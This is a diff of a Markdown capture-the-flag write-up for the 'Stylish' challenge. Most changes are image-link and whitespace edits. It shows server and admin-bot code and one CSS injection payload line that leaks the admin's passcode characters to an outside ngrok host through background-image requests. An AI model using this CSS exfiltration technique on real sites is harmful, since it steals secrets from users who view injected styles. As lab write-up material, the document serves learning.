@@ -1,26 +1,26 @@
 # Stylish
 
 ## Challenge description 
-![[Pasted image 20210614000841.png]]
+![img](Pasted_image_20210614000841.png)</br>
 As we can see Stylish is the one of the hardest challenges at the website and it give us 400 points.
 Organizers give us URL to website and server source code files.  
 
 
 ## Look at the website 
-![[Pasted image 20210613000440.png]]
-![[Pasted image 20210613000518.png]]
+![img](Pasted_image_20210613000440.png)</br>
+![img](Pasted_image_20210613000518.png)</br>
 Ok so as we can see at website we have got 4 color inputs serialized with JSON and send by GET parameter. By clicking "Submit for review" button we can  send them to admin.    
 But second important thing in our website is "Get flag" button.
 
-![[Pasted image 20210613000448.png]]
+![img](Pasted_image_20210613000448.png)</br>
  As we can see we need to know admin secret code to get the flag.
 
 ## Look at the source code 
 #### passcode.js
 ```js
-export default function generatePasscode() {
+export default function generatePasscode() {
 	const chars = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F"];
-	for (let i = 0; i < chars.length - 1; i++) {
+	for (let i = 0; i < chars.length - 1; i++) {
 		let temp = chars[i];
 		let j = Math.floor(Math.random() * (chars.length - i)) + i;
 		chars[i] = chars[j];
@@ -37,19 +37,19 @@ app.post("/submit", async (req, res) => {
 
  try {
 	 const {bg, fg, bbg, bfg} = req.body;
-	 if (typeof bg !== "string") return res.status(400).type("txt").send("bg must be a string");
-	 if (typeof fg !== "string") return res.status(400).type("txt").send("fg must be a string");
-	 if (typeof bbg !== "string") return res.status(400).type("txt").send("bbg must be a string");
-	 if (typeof bfg !== "string") return res.status(400).type("txt").send("bfg must be a string");
+	 if (typeof bg !== "string") return res.status(400).type("txt").send("bg must be a string");
+	 if (typeof fg !== "string") return res.status(400).type("txt").send("fg must be a string");
+	 if (typeof bbg !== "string") return res.status(400).type("txt").send("bbg must be a string");
+	 if (typeof bfg !== "string") return res.status(400).type("txt").send("bfg must be a string");
 	 const encoded = encodeURIComponent(JSON.stringify({ bg, fg, bbg, bfg }));
-	 if (encoded.length > 2000) return res.status(400).type("txt").send("Theme permalink too long (>2000 chars)");
+	 if (encoded.length > 2000) return res.status(400).type("txt").send("Theme permalink too long (>2000 chars)");
 
   
 
 	 await visit('http://localhost:1337/#${encoded}', passcode);
 	 res.type("txt");
-	 res.send("The admin has checked out your theme!");
- } catch (e) {
+	 res.send("The admin has checked out your theme!");
+ } catch (e) {
 	 console.error(e.stack);
 	 res.sendStatus(500);
  }
@@ -57,17 +57,17 @@ app.post("/submit", async (req, res) => {
 ```
 #### visit.js
 ```js
- await page.goto(url, {waitUntil: "load", timeout: 1000});
+ await page.goto(url, {waitUntil: "load", timeout: 1000});
  await page.click("#get-flag");
  await page.waitForSelector(".e");
 
- for (let i \= 0; i < passcode.length; i++) {
+ for (let i \= 0; i < passcode.length; i++) {
 	const char \= passcode.charAt(i);
 	const id \= "button" + Math.floor(Math.random() \* 123456);
 	await page.evaluate(\`
-		document.querySelectorAll(".e > button").forEach(button => {
-			if (button.innerText === "${char}") {
-				button.id = "${id}";
+		document.querySelectorAll(".e > button").forEach(button => {
+			if (button.innerText === "${char}") {
+				button.id = "${id}";
 			}
 		})
 	`);
@@ -112,8 +112,8 @@ button:nth-child(16)[id^="b"]{background:url("http://7dcf938e36aa.ngrok.io/F")}
 
 
 ### payload sent
-![[Pasted image 20210612234737.png]]
+![img](Pasted_image_20210612234737.png)</br>
 Unfortunately my exploit doesn't catch one number (zero) so I had to brute force his position :(
 
-![[Pasted image 20210613000604.png]]
+![img](Pasted_image_20210613000604.png)</br>
 After few minute we got the flag.
